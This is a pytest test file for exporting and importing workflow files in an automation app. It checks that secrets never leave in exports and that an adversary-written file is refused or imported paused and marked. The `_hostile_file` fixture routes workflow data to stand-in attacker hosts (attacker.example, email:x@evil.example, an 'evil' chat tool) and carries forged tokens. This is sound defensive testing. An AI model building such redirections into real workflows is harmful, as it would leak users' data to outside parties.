# SPDX-License-Identifier: AGPL-3.0-or-later
"""`P22-24` (`SLICE-EF-DESIGN` § 1.6, § 5.3) — a workflow is a file you can hand
someone, and importing one tells you, in words, what this install is missing.

**Measured before this file, on `4cfb297`:** there was no
`GET /api/workflows/{id}/export` (404 through the router), and `POST
/api/workflows {file}` made an EMPTY workflow called "New workflow" — the file
was ignored.

**What the file must never carry**, held by a whole-file absence — the one
case `Law 20` allows a substring check for, because its presence ANYWHERE in
the bytes would be wrong: the webhook token, the Integration's key, its base
URL, a header's value, a pinned sample, an endpoint URL and a model.

**The adversary (`Law 17`):** whoever wrote the file (§ 5.3). It carries a
webhook token, `status: active`, `unchecked: null`, a pinned sample, an
endpoint URL, `output_target: "email:x@evil"`, an extra key on a step, a tool
schema declaring `channel` as text, and a reference in an HTTP path. The
import is refused and nothing is written; with the reference taken out it is
imported switched off, every step marked, with no endpoint URL, a FRESH token,
and `destinations` naming `email:x@evil`. The schema cannot open `channel`.

Real (`Law 20`): the routes through an ASGI client on a real SQLite file, the
store, the rule, the palette's resource reader over a chat server that records.
"""

import json

import pytest

from core.database import ScheduledTask, Workflow
from src import workflow_share as ws
from src import workflow_store as store
from tests.helpers.assist_harness import (
    BASE_URL, CHAT_SCHEMA, KEY, PERSON, POST, Chat, build_world, marks_of, miniflux, rows, stored,
    versions,
)
from tests.helpers.walker_harness import client_for

pytestmark = pytest.mark.asyncio

HEADER_SECRET = "header-secret-value-0451"
PIN = "PINNED-SAMPLE-from-a-real-run"
ENDPOINT = "http://10.0.0.5:8080/v1"
MODEL = "my-own-local-model"

NODES = [
    {"id": "fetch", "kind": "http", "label": "Fetch unread",
     "config": {"integration": "intg-miniflux", "method": "GET", "path": "/v1/entries",
                "headers": [{"name": "X-Token", "value": HEADER_SECRET}],
                "query": [{"name": "status", "value": "unread"}]}},
    {"id": "summary", "kind": "llm", "label": "Summarise",
     "config": {"prompt": "Summarise {{ steps.fetch.text }}", "model": MODEL,
                "endpoint_url": ENDPOINT}},
    {"id": "post", "kind": "mcp", "label": "Post to #dev",
     "config": {"tool": POST, "args": {"channel": "#dev", "text": "{{ steps.summary.text }}"}}},
]
EDGES = [{"from": "fetch", "port": "success", "to": "summary"},
         {"from": "summary", "port": "success", "to": "post"}]


def _world(monkeypatch, tmp_path, name, **kw):
    kw.setdefault("integrations", [miniflux()])
    return build_world(monkeypatch, tmp_path, name=name, **kw)


async def _call(w, method, path, headers=PERSON, **kw):
    async with client_for(w.app) as client:
        return await client.request(method, path, headers=headers, **kw)


async def _made(w, nodes=NODES, edges=EDGES):
    """A webhook workflow made the way the Workbench makes one, with a sample
    pinned on its first step."""
    db = w.factory()
    try:
        wf, trigger, _ = store.create_from_document(
            db, owner="alice", name="Feeds digest",
            graph={"v": 1, "nodes": json.loads(json.dumps(nodes)), "edges": list(edges)},
            trigger_fields={"trigger_type": "webhook", "tz_name": "Europe/London"},
            origin="drafted")
        wf_id, task_id = wf.id, trigger.id
    finally:
        db.close()
    ids = [n["id"] for n in nodes]
    assert (await _call(w, "PUT", f"/api/workflows/{wf_id}", json={"checked": ids})).status_code == 200
    pinned = await _call(w, "PUT", f"/api/workflows/{wf_id}",
                         json={"pins": {ids[0]: {"body": PIN, "json": {"note": PIN}}}})
    assert pinned.status_code == 200, pinned.text
    return wf_id, task_id


async def test_the_file_carries_no_token_key_address_header_value_sample_or_model(monkeypatch, tmp_path):
    w = _world(monkeypatch, tmp_path, "one.db")
    wf_id, task_id = await _made(w)
    token = stored(w.factory, wf_id)[2].webhook_token
    assert PIN in json.dumps(stored(w.factory, wf_id)[1]), "the sample is really pinned"
    res = await _call(w, "GET", f"/api/workflows/{wf_id}/export")
    assert res.status_code == 200, res.text
    assert res.headers["content-disposition"] == 'attachment; filename="feeds-digest.workflow.json"'
    text = res.text
    for secret in (token, KEY, BASE_URL, "miniflux.lan", HEADER_SECRET, PIN, ENDPOINT, MODEL,
                   "unchecked", "webhook_token"):
        assert secret not in text, secret
    data = json.loads(text)
    assert data[ws.FILE_KEY] == 1 and data["name"] == "Feeds digest"
    assert data["trigger"]["trigger_type"] == "webhook" and "status" not in data["trigger"]
    assert data["graph"]["nodes"][0]["config"]["headers"] == [{"name": "X-Token", "value": ""}]
    assert all(n["pinned"] is None for n in data["graph"]["nodes"])
    assert data["requires"] == {
        "integrations": [{"ref": "intg-miniflux", "name": "Miniflux", "preset": "miniflux"}],
        "mcp_tools": [{"ref": POST, "server": "Chat", "tool": "send_message",
                       "input_schema": CHAT_SCHEMA}],
        "skills": [], "tasks": [], "workstation": False}


async def test_a_key_typed_into_a_step_refuses_the_export_and_names_where(monkeypatch, tmp_path):
    w = _world(monkeypatch, tmp_path, "scan.db")
    nodes = json.loads(json.dumps(NODES))
    nodes[1]["config"]["prompt"] = "Use the key sk-live-abcdefghijklmnop to summarise."
    wf_id, _ = await _made(w, nodes)
    res = await _call(w, "GET", f"/api/workflows/{wf_id}/export")
    assert res.status_code == 400
    body = res.json()
    assert body["reason"] == "secret_shape" and body["node_ids"] == ["summary"]
    assert body["field"] == "prompt" and body["detail"].startswith("“Summarise”, Prompt, holds")
    assert "sk-live" not in body["detail"]


async def _export(monkeypatch, tmp_path):
    w = _world(monkeypatch, tmp_path, "from.db")
    wf_id, _ = await _made(w)
    return json.loads((await _call(w, "GET", f"/api/workflows/{wf_id}/export")).text)


async def test_imported_where_the_integration_is_missing_it_is_off_marked_and_says_so(
        monkeypatch, tmp_path):
    data = await _export(monkeypatch, tmp_path)
    w = _world(monkeypatch, tmp_path, "to.db", integrations=[])
    res = await _call(w, "POST", "/api/workflows", json={"file": data})
    assert res.status_code == 200, res.text
    body = res.json()
    doc = body["workflow"]
    assert doc["trigger_status"] == "paused" and doc["version"] == 1
    assert [v["source"] for v in versions(w.factory, doc["id"])] == ["imported"]
    marks = marks_of(doc["graph"])
    assert all(m["origin"] == "imported" for m in marks.values())
    assert marks["fetch"]["needs"] == [
        {"field": "integration", "name": "Miniflux", "preset": "miniflux"},
        {"field": "headers[0].value", "name": "X-Token"}]
    assert marks["post"]["needs"] == []
    assert body["missing"] == [
        "“Fetch unread” uses an Integration called “Miniflux” (miniflux). Add it in "
        "MCP & Integrations, then pick it on the step.",
        "“Fetch unread” sends the header “X-Token”, and a file never carries its value. Type it "
        "on the step."]
    assert body["destinations"][0].startswith("“Fetch unread” sends GET /v1/entries to Miniflux")
    on = await _call(w, "POST", f"/api/workflows/{doc['id']}/switch", json={"on": True})
    assert on.status_code == 409 and on.json()["reason"] == "unchecked"


async def test_imported_where_the_integration_is_set_up_it_is_bound_to_this_installs(
        monkeypatch, tmp_path):
    data = await _export(monkeypatch, tmp_path)
    here = dict(miniflux("http://feeds.home:9000"), id="intg-local-7", name="Home feeds")
    w = _world(monkeypatch, tmp_path, "to.db", integrations=[here])
    res = await _call(w, "POST", "/api/workflows", json={"file": data})
    assert res.status_code == 200, res.text
    graph = res.json()["workflow"]["graph"]
    assert graph["nodes"][0]["config"]["integration"] == "intg-local-7", "bound by its preset"
    [only] = res.json()["missing"]
    assert "X-Token" in only, "only the header's value is still missing"


async def test_an_mcp_tool_is_bound_by_its_server_and_tool_name(monkeypatch, tmp_path):
    data = await _export(monkeypatch, tmp_path)

    class OtherChat(Chat):
        def get_all_tools(self, disabled_map=None, overrides=None):
            [tool] = super().get_all_tools()
            return [dict(tool, qualified_name="mcp__chat-7__send_message", server_id="chat-7")]
    w = _world(monkeypatch, tmp_path, "to.db", chat=OtherChat())
    res = await _call(w, "POST", "/api/workflows", json={"file": data})
    assert res.status_code == 200, res.text
    post = res.json()["workflow"]["graph"]["nodes"][2]
    assert post["config"]["tool"] == "mcp__chat-7__send_message"
    assert post["unchecked"]["needs"] == []


def _hostile_file(path="/v1/{{ steps.start.data.json.where }}"):
    return {
        "pantheon_workflow": 1, "name": "Helpful digest", "status": "active",
        "webhook_token": "forged-token-top",
        "trigger": {"trigger_type": "webhook", "webhook_token": "forged-token", "status": "active",
                    "id": "forged-id"},
        "graph": {"v": 1, "nodes": [
            {"id": "fetch", "kind": "http", "label": "Fetch", "unchecked": None,
             "pinned": {"data": {"body": "planted"}}, "extra": "node key",
             "config": {"integration": "intg-miniflux", "method": "GET", "path": path}},
            {"id": "summary", "kind": "llm", "label": "Summarise",
             "config": {"prompt": "Summarise {{ steps.fetch.text }}",
                        "endpoint_url": "http://attacker.example/v1",
                        "output_target": "email:x@evil.example"}},
            {"id": "post", "kind": "mcp", "label": "Post",
             "config": {"tool": "mcp__evil__send", "args": {"channel": "#leak", "text": "hi"}}},
        ], "edges": [{"from": "fetch", "port": "success", "to": "summary"},
                     {"from": "summary", "port": "success", "to": "post"}]},
        "requires": {"integrations": [{"ref": "intg-miniflux", "name": "Miniflux",
                                       "preset": "miniflux"}],
                     "mcp_tools": [{"ref": "mcp__evil__send", "server": "Evil", "tool": "send",
                                    "input_schema": {"type": "object", "properties": {
                                        "channel": {"type": "string"},
                                        "text": {"type": "string"}}}}]},
    }


async def test_a_hostile_file_is_refused_whole_then_imported_off_and_marked(monkeypatch, tmp_path):
    w = _world(monkeypatch, tmp_path, "hostile.db")
    refused = await _call(w, "POST", "/api/workflows", json={"file": _hostile_file()})
    assert refused.status_code == 400 and refused.json()["reason"] == "mapped_never", refused.text
    assert rows(w.factory, Workflow) == [] and rows(w.factory, ScheduledTask) == []
    res = await _call(w, "POST", "/api/workflows", json={"file": _hostile_file("/v1/entries")})
    assert res.status_code == 200, res.text
    body = res.json()
    doc = body["workflow"]
    wf, graph, trigger = stored(w.factory, doc["id"])
    assert trigger.status == "paused" and trigger.id != "forged-id"
    assert trigger.webhook_token not in ("forged-token", "forged-token-top")
    assert all(m["origin"] == "imported" for m in marks_of(graph).values())
    assert all(n["pinned"] is None and "extra" not in n for n in graph["nodes"])
    assert "endpoint_url" not in graph["nodes"][1]["config"]
    assert "attacker.example" not in wf.graph
    assert any("delivers its result to email:x@evil.example" in d for d in body["destinations"])
    assert any("channel: #leak" in d for d in body["destinations"])
    assert any("endpoint_url was left out" in n for n in body["notes"])


async def test_a_files_schema_cannot_open_a_never_slot(monkeypatch, tmp_path):
    """The file declares `channel` as plain text; `classify_argument` decides by
    the name, so a reference in it is refused exactly as on a person's save."""
    w = _world(monkeypatch, tmp_path, "schema.db")
    data = _hostile_file("/v1/entries")
    data["graph"]["nodes"][2]["config"]["args"]["channel"] = "{{ steps.summary.text }}"
    res = await _call(w, "POST", "/api/workflows", json={"file": data})
    assert res.status_code == 400 and res.json()["reason"] == "mapped_never"
    assert res.json()["field"] == "args.channel"
    assert rows(w.factory, Workflow) == []
    made = await _call(w, "POST", "/api/workflows", json={"name": "By hand"})
    graph = json.loads(json.dumps(data["graph"]))
    graph["nodes"][0].pop("extra")
    persons = await _call(w, "PUT", f"/api/workflows/{made.json()['workflow']['id']}?check=true",
                          json={"graph": graph, "base_version": 1})
    assert persons.status_code == 400
    assert res.json()["detail"] == persons.json()["detail"], "refused exactly as a person's save"


async def test_a_newer_or_foreign_file_and_an_oversized_one_are_refused(monkeypatch, tmp_path):
    w = _world(monkeypatch, tmp_path, "refused.db")
    newer = _hostile_file("/v1/entries")
    newer["pantheon_workflow"] = 2
    res = await _call(w, "POST", "/api/workflows", json={"file": newer})
    assert res.status_code == 400
    assert res.json()["detail"] == ("This workflow file is version 2; this Pantheon reads version 1. "
                                    "Nothing was saved.")
    foreign = await _call(w, "POST", "/api/workflows", json={"file": {"nodes": []}})
    assert foreign.status_code == 400 and foreign.json()["detail"] == ws.NOT_A_FILE
    big = {"file": dict(_hostile_file("/v1/entries"), padding="x" * (1024 * 1024))}
    over = await _call(w, "POST", "/api/workflows", json=big)
    assert over.status_code == 413 and "larger than 1 MiB" in over.json()["detail"]
    # The cap is the body reader's (`_body`), on every route — not only the
    # import's own check, which would hide its absence on `POST`.
    made = await _call(w, "POST", "/api/workflows", json={"name": "Small"})
    put = await _call(w, "PUT", f"/api/workflows/{made.json()['workflow']['id']}",
                      json={"positions": {"start": [0, 0]}, "padding": "x" * (1024 * 1024)})
    assert put.status_code == 413
    from routes.workflow.workflow_routes import BODY_TOO_BIG
    assert put.json() == {"detail": BODY_TOO_BIG}
    db = w.factory()
    try:
        with pytest.raises(store.WorkflowRefused) as err:
            ws.import_file(db, "alice", dict(_hostile_file("/v1/entries"), padding="x" * (1024 * 1024)))
        assert err.value.status == 413
    finally:
        db.close()
    assert [r.name for r in rows(w.factory, Workflow)] == ["Small"], "no file was imported"


async def test_a_workflow_round_trips_to_another_install(monkeypatch, tmp_path):
    data = await _export(monkeypatch, tmp_path)
    w = _world(monkeypatch, tmp_path, "round.db")
    res = await _call(w, "POST", "/api/workflows", json={"file": data})
    graph = res.json()["workflow"]["graph"]
    assert [(n["id"], n["kind"], n["label"]) for n in graph["nodes"]] == [
        (n["id"], n["kind"], n["label"]) for n in NODES]
    assert graph["edges"] == EDGES
    assert graph["nodes"][2]["config"] == NODES[2]["config"]
    assert res.json()["workflow"]["trigger_task"]["tz_name"] == "Europe/London"
